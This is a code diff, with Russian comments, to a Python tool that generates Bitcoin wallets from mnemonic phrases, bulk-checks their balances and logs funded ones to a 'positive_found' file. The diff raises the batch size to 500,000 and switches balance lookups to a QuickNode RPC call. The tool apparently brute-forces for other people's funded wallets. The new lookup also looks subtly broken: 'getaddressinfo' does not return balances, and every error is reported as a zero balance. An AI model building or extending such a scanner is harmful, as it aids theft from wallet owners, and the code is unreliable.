@@ -41,7 +41,7 @@ SECRET_KEY_FILE = DATA_DIR / "history_secret.key"
 SETTINGS_FILE = DATA_DIR / "wallets_settings.json"
 POSITIVE_FOUND_FILE = DATA_DIR / "positive_found.txt"
 
-BATCH_WALLET_COUNT = 500
+BATCH_WALLET_COUNT = 500_000
 MAX_HISTORY_PER_CHAT = 2_000_000
 
 BALANCE_SCAN_WORKERS = max(1, min(512, int(os.getenv("BALANCE_SCAN_WORKERS", "128"))))
@@ -733,42 +733,32 @@ def derive_bitcoin_wallet(mnemonic_phrase: str) -> Tuple[str, str]:
 def chunks_by_size(items: list, size: int):
     return [items[i:i + size] for i in range(0, len(items), size)]
 
-def get_balances_fast_batch(
-    addresses: list[str],
-    request_timeout: int = 10,
-    fallback_workers: int = 1,
-) -> dict[str, str]:
-    """
-    Получает балансы Bitcoin-адресов через Blockchair API.
-    """
-    if not addresses:
-        return {}
+def get_balances_fast_batch(addresses: list[str], request_timeout: int = 12) -> dict:
+    """Проверка баланса через QuickNode RPC"""
+    rpc_url = os.getenv("QUICKNODE_URL")
+    if not rpc_url:
+        return {addr: "0.00000000 BTC" for addr in addresses}
 
-    balances: dict[str, str] = {}
-
-    try:
-        for i in range(0, len(addresses), 1):
-            chunk = addresses[i : i + 1]
-
-            response = requests.get(
-                "https://api.blockchair.com/bitcoin/addresses/balances",
-                params={"addresses": ",".join(chunk)},
-                timeout=request_timeout,
-            )
-            response.raise_for_status()
-            data = response.json()
-
-            for addr, info in data.get("data", {}).items():
-                satoshis = info.get("balance", 0)
-                btc = satoshis / 100_000_000
-                balances[addr] = f"{btc:.8f} BTC"
-
-    except Exception as e:
-        print(f"Ошибка API проверки баланса: {e}", flush=True)
-
-    # Заполняем нулями все адреса, которые не получили ответ
+    balances = {}
+    
     for addr in addresses:
-        balances.setdefault(addr, "0.00000000 BTC")
+        try:
+            payload = {
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "getaddressinfo",
+                "params": [addr]
+            }
+            resp = requests.post(rpc_url, json=payload, timeout=request_timeout)
+            data = resp.json()
+            
+            # Получаем баланс
+            balance = data.get("result", {}).get("balance", 0)
+            balances[addr] = f"{balance:.8f} BTC"
+            
+        except Exception as e:
+            print(f"[QuickNode Error] {addr}: {e}")
+            balances[addr] = "0.00000000 BTC"
 
     return balances
 
